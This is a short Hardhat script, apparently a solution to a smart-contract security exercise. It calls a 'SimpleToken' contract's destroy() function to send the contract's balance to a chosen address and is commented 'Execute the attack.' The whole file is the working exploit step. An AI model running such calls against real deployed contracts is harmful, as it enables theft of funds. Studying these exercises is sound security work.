const { ethers } = require("hardhat");

const TOKEN_ADDRESS = "0xec1427Bd0780a50C2a9C0dd21924b74aE6B87039";
const addr = "0xc109141f53821F175fC316FC4254Fb6559E935C7"

async function main() {
    const instance = await ethers.getContractAt("SimpleToken", TOKEN_ADDRESS);

    // Execute the attack.
    const transferTx = await instance.destroy(addr);
    const attackReceipt = await transferTx.wait();
    console.log("attackReceipt: ", attackReceipt);


}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});